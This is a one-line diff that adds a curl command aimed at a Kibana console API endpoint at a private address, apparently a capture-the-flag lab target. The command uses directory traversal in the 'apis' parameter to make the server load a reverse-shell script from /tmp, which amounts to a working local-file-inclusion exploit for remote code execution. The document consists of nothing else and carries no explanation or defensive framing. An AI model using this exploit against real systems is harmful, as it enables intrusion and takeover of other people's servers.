@@ -1,0 +1,1 @@
+curl -x GET -d "sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../tmp/reverse_shell.js" http://10.10.10.115:5601/api/console/api_server
